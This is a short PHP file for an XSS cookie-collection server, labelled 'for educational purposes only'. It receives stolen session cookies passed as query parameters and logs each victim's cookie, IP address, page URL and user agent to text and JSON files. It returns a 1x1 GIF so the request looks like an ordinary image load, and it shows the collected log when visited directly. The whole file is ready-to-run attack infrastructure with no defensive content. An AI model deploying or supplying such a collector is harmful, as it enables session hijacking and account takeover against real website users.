<?php
// Cookie Receiver Server
// This server receives stolen cookies from XSS attacks
// WARNING: For educational purposes only

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *'); // Allow requests from any origin (for XSS)

$log_file = 'stolen_cookies.txt';
$timestamp = date('Y-m-d H:i:s');

// Get the stolen cookie data
$cookie_data = isset($_GET['cookie']) ? $_GET['cookie'] : '';
$page_url = isset($_GET['url']) ? $_GET['url'] : 'unknown';
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'unknown';
$ip_address = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown';

if (!empty($cookie_data)) {
    // Log the stolen cookie
    $log_entry = sprintf(
        "[%s] IP: %s | URL: %s | Cookie: %s | User-Agent: %s\n",
        $timestamp,
        $ip_address,
        $page_url,
        $cookie_data,
        $user_agent
    );
    
    file_put_contents($log_file, $log_entry, FILE_APPEND);
    
    // Also log to a JSON file for easier parsing
    $json_log = [
        'timestamp' => $timestamp,
        'ip_address' => $ip_address,
        'page_url' => $page_url,
        'cookie' => $cookie_data,
        'user_agent' => $user_agent
    ];
    
    $json_file = 'stolen_cookies.json';
    $existing_data = [];
    if (file_exists($json_file)) {
        $existing_data = json_decode(file_get_contents($json_file), true) ?: [];
    }
    $existing_data[] = $json_log;
    file_put_contents($json_file, json_encode($existing_data, JSON_PRETTY_PRINT));
    
    // Return success (this will be loaded as an image, so we return a 1x1 pixel)
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
} else {
    // If accessed directly, show the log
    if (file_exists($log_file)) {
        echo "<h1>Stolen Cookies Log</h1>";
        echo "<pre>" . htmlspecialchars(file_get_contents($log_file)) . "</pre>";
    } else {
        echo "<h1>Cookie Receiver</h1>";
        echo "<p>No cookies received yet. Waiting for XSS payload...</p>";
    }
}
?>

